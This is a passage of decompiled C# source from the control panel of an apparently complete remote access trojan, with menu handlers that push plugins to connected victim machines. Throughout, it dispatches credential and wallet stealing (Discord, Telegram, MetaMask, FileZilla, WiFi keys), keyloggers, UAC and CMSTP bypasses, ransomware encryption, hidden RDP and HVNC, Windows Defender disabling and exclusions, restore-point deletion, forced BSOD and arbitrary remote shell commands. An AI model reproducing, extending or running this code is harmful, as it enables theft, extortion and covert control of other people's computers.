				ThreadPool.QueueUserWorkItem(closure_0024__R840_002D._Lambda_0024__R84, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "FirewallE");
			_Closure_0024__R841_002D84 closure_0024__R841_002D = default(_Closure_0024__R841_002D84);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R841_002D = new _Closure_0024__R841_002D84(closure_0024__R841_002D);
				closure_0024__R841_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R841_002D._Lambda_0024__R86, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "FirewallD");
			_Closure_0024__R842_002D86 closure_0024__R842_002D = default(_Closure_0024__R842_002D86);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R842_002D = new _Closure_0024__R842_002D86(closure_0024__R842_002D);
				closure_0024__R842_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R842_002D._Lambda_0024__R88, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "UpdatesE");
			_Closure_0024__R843_002D88 closure_0024__R843_002D = default(_Closure_0024__R843_002D88);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R843_002D = new _Closure_0024__R843_002D88(closure_0024__R843_002D);
				closure_0024__R843_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R843_002D._Lambda_0024__R90, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "UpdatesD");
			_Closure_0024__R844_002D90 closure_0024__R844_002D = default(_Closure_0024__R844_002D90);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R844_002D = new _Closure_0024__R844_002D90(closure_0024__R844_002D);
				closure_0024__R844_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R844_002D._Lambda_0024__R92, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ResetScaleToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "scale");
			_Closure_0024__R845_002D92 closure_0024__R845_002D = default(_Closure_0024__R845_002D92);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R845_002D = new _Closure_0024__R845_002D92(closure_0024__R845_002D);
				closure_0024__R845_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R845_002D._Lambda_0024__R94, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void InvokeBSODToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0 || MessageBox.Show("Are You Sure?", "Invoke-BSOD!", MessageBoxButtons.YesNo) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "BSOD");
			_Closure_0024__R846_002D94 closure_0024__R846_002D = default(_Closure_0024__R846_002D94);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R846_002D = new _Closure_0024__R846_002D94(closure_0024__R846_002D);
				closure_0024__R846_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R846_002D._Lambda_0024__R96, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DeleteRestoreToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "DeletePoints");
			_Closure_0024__R847_002D96 closure_0024__R847_002D = default(_Closure_0024__R847_002D96);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R847_002D = new _Closure_0024__R847_002D96(closure_0024__R847_002D);
				closure_0024__R847_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R847_002D._Lambda_0024__R98, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Net35InstallToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "Net3");
			_Closure_0024__R848_002D98 closure_0024__R848_002D = default(_Closure_0024__R848_002D98);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R848_002D = new _Closure_0024__R848_002D98(closure_0024__R848_002D);
				closure_0024__R848_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R848_002D._Lambda_0024__R100, array);
			}
			Module0.smethod_3(".Net 3.5 Install..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DiscordTokenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(2));
			_Closure_0024__R849_002D100 closure_0024__R849_002D = default(_Closure_0024__R849_002D100);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R849_002D = new _Closure_0024__R849_002D100(closure_0024__R849_002D);
				closure_0024__R849_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R849_002D._Lambda_0024__R102, array);
			}
			Module0.smethod_3("DiscordToken..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void TelegramSessionToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(4));
			_Closure_0024__R850_002D102 closure_0024__R850_002D = default(_Closure_0024__R850_002D102);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R850_002D = new _Closure_0024__R850_002D102(closure_0024__R850_002D);
				closure_0024__R850_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R850_002D._Lambda_0024__R104, array);
			}
			Module0.smethod_3("TelegramSession..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ProductKeyToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(3));
			_Closure_0024__R851_002D104 closure_0024__R851_002D = default(_Closure_0024__R851_002D104);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R851_002D = new _Closure_0024__R851_002D104(closure_0024__R851_002D);
				closure_0024__R851_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R851_002D._Lambda_0024__R106, array);
			}
			Module0.smethod_3("ProductKey..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void MetaMaskToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(5));
			_Closure_0024__R852_002D106 closure_0024__R852_002D = default(_Closure_0024__R852_002D106);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R852_002D = new _Closure_0024__R852_002D106(closure_0024__R852_002D);
				closure_0024__R852_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R852_002D._Lambda_0024__R108, array);
			}
			Module0.smethod_3("MetaMask..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FileZillaToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(0));
			_Closure_0024__R853_002D108 closure_0024__R853_002D = default(_Closure_0024__R853_002D108);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R853_002D = new _Closure_0024__R853_002D108(closure_0024__R853_002D);
				closure_0024__R853_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R853_002D._Lambda_0024__R110, array);
			}
			Module0.smethod_3("FileZilla..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void WifiKeysToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(1));
			_Closure_0024__R854_002D110 closure_0024__R854_002D = default(_Closure_0024__R854_002D110);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R854_002D = new _Closure_0024__R854_002D110(closure_0024__R854_002D);
				closure_0024__R854_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R854_002D._Lambda_0024__R112, array);
			}
			Module0.smethod_3("WifiKeys..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void StartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		string text = Interaction.InputBox("Send a notification when client open a specific window", "ReportWindow", "YouTube, Photoshop, Steam");
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		byte[] array = Module0.smethod_6("StartReport" + GClass19.string_0 + text);
		_Closure_0024__R855_002D112 closure_0024__R855_002D = default(_Closure_0024__R855_002D112);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R855_002D = new _Closure_0024__R855_002D112(closure_0024__R855_002D);
			closure_0024__R855_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R855_002D._Lambda_0024__R114, array);
		}
	}

	private void StopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("StopReport");
		_Closure_0024__R856_002D114 closure_0024__R856_002D = default(_Closure_0024__R856_002D114);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R856_002D = new _Closure_0024__R856_002D114(closure_0024__R856_002D);
			closure_0024__R856_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R856_002D._Lambda_0024__R116, array);
		}
	}

	private void PerformanceToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Performance.dll"));
			_Closure_0024__R857_002D116 closure_0024__R857_002D = default(_Closure_0024__R857_002D116);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R857_002D = new _Closure_0024__R857_002D116(closure_0024__R857_002D);
				closure_0024__R857_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R857_002D._Lambda_0024__R118, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EditHostsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("Hosts");
		_Closure_0024__R858_002D118 closure_0024__R858_002D = default(_Closure_0024__R858_002D118);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R858_002D = new _Closure_0024__R858_002D118(closure_0024__R858_002D);
			closure_0024__R858_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R858_002D._Lambda_0024__R120, array);
		}
	}

	private void OfflineToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("OfflineGet");
		_Closure_0024__R859_002D120 closure_0024__R859_002D = default(_Closure_0024__R859_002D120);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R859_002D = new _Closure_0024__R859_002D120(closure_0024__R859_002D);
			closure_0024__R859_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R859_002D._Lambda_0024__R122, array);
		}
		Module0.smethod_3("Offlinekeylogger..", Color.Black);
		method_1();
	}

	private void OnlineToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Keylogger.dll"));
			_Closure_0024__R860_002D122 closure_0024__R860_002D = default(_Closure_0024__R860_002D122);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R860_002D = new _Closure_0024__R860_002D122(closure_0024__R860_002D);
				closure_0024__R860_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R860_002D._Lambda_0024__R124, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ClientChatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("Xchat");
		_Closure_0024__R861_002D124 closure_0024__R861_002D = default(_Closure_0024__R861_002D124);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R861_002D = new _Closure_0024__R861_002D124(closure_0024__R861_002D);
			closure_0024__R861_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R861_002D._Lambda_0024__R126, array);
		}
	}

	private void CommandsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		string text = Interaction.InputBox("Set Commands", "Commands", "cmd.exe /c start calc");
		if (text.Length == 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("RunShell" + GClass19.string_0 + text);
		_Closure_0024__R862_002D126 closure_0024__R862_002D = default(_Closure_0024__R862_002D126);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R862_002D = new _Closure_0024__R862_002D126(closure_0024__R862_002D);
			closure_0024__R862_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R862_002D._Lambda_0024__R128, array);
		}
	}

	private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\MessageBox.dll"));
			_Closure_0024__R863_002D128 closure_0024__R863_002D = default(_Closure_0024__R863_002D128);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R863_002D = new _Closure_0024__R863_002D128(closure_0024__R863_002D);
				closure_0024__R863_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R863_002D._Lambda_0024__R130, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RunAsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\UACBypass.dll") + GClass19.string_0 + "0");
			_Closure_0024__R864_002D130 closure_0024__R864_002D = default(_Closure_0024__R864_002D130);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R864_002D = new _Closure_0024__R864_002D130(closure_0024__R864_002D);
				closure_0024__R864_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R864_002D._Lambda_0024__R132, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void CmstpToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Cmstp-Bypass.dll") + GClass19.string_0 + "0");
			_Closure_0024__R865_002D132 closure_0024__R865_002D = default(_Closure_0024__R865_002D132);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R865_002D = new _Closure_0024__R865_002D132(closure_0024__R865_002D);
				closure_0024__R865_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R865_002D._Lambda_0024__R134, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EncryptToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count > 0)
		{
			new Ransomware().ShowDialog();
		}
	}

	private void DecryptToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Ransomware.dll") + GClass19.string_0 + "False");
			_Closure_0024__R867_002D134 closure_0024__R867_002D = default(_Closure_0024__R867_002D134);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R867_002D = new _Closure_0024__R867_002D134(closure_0024__R867_002D);
				closure_0024__R867_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R867_002D._Lambda_0024__R136, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ReverseProxyToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\ReverseProxy.dll") + GClass19.string_0 + "False");
			GClass5 gClass = (GClass5)Lv1.SelectedItems[0].Tag;
			GClass5 gClass2 = gClass;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void NgrokInstallerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Ngrok-Installer.dll"));
			_Closure_0024__R869_002D138 closure_0024__R869_002D = default(_Closure_0024__R869_002D138);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R869_002D = new _Closure_0024__R869_002D138(closure_0024__R869_002D);
				closure_0024__R869_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R869_002D._Lambda_0024__R140, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void HiddenRDPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\HRDP.dll"));
			GClass5 gClass = (GClass5)Lv1.SelectedItems[0].Tag;
			GClass5 gClass2 = gClass;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RunPEToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\HVNC.dll"));
			_Closure_0024__R871_002D142 closure_0024__R871_002D = default(_Closure_0024__R871_002D142);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R871_002D = new _Closure_0024__R871_002D142(closure_0024__R871_002D);
				closure_0024__R871_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R871_002D._Lambda_0024__R144, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void MemoryToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\HVNCMemory.dll"));
			_Closure_0024__R872_002D144 closure_0024__R872_002D = default(_Closure_0024__R872_002D144);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R872_002D = new _Closure_0024__R872_002D144(closure_0024__R872_002D);
				closure_0024__R872_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R872_002D._Lambda_0024__R146, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void BotkillerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "RunBotKiller");
			_Closure_0024__R873_002D146 closure_0024__R873_002D = default(_Closure_0024__R873_002D146);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R873_002D = new _Closure_0024__R873_002D146(closure_0024__R873_002D);
				closure_0024__R873_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R873_002D._Lambda_0024__R148, array);
			}
			Module0.smethod_3("Botkiller..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void WDKillerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "WDKiller");
			_Closure_0024__R874_002D148 closure_0024__R874_002D = default(_Closure_0024__R874_002D148);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R874_002D = new _Closure_0024__R874_002D148(closure_0024__R874_002D);
				closure_0024__R874_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R874_002D._Lambda_0024__R150, array);
			}
			Module0.smethod_3("WDKiller..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void WDDisableToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "WDDisable");
			_Closure_0024__R875_002D150 closure_0024__R875_002D = default(_Closure_0024__R875_002D150);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R875_002D = new _Closure_0024__R875_002D150(closure_0024__R875_002D);
				closure_0024__R875_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R875_002D._Lambda_0024__R152, array);
			}
			Module0.smethod_3("WDDisable..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void WDExclusionToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "WDExclusion");
			_Closure_0024__R876_002D152 closure_0024__R876_002D = default(_Closure_0024__R876_002D152);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R876_002D = new _Closure_0024__R876_002D152(closure_0024__R876_002D);
				closure_0024__R876_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R876_002D._Lambda_0024__R154, array);
			}
			Module0.smethod_3("WDExclusion..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Main_Activated(object sender, EventArgs e)
	{
		if (bool_0)
		{
			base.Opacity = 1.0;
		}
	}

	private void Main_Deactivate(object sender, EventArgs e)
	{
		base.Opacity = 0.99;
	}

	private void WDExclusionToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv3.Items.Count > 0)
		{
			foreach (ListViewItem item in Lv3.Items)
			{
				if (Operators.CompareString(item.Text, "WDExclusion", TextCompare: false) == 0)
				{
					return;
				}
			}
		}
		ListViewItem listViewItem = new ListViewItem();
		listViewItem.Text = "WDExclusion";
		listViewItem.SubItems.Add("0");
		listViewItem.ToolTipText = Guid.NewGuid().ToString();
		Lv3.Items.Add(listViewItem);
		Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
		byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "WDExclusion");
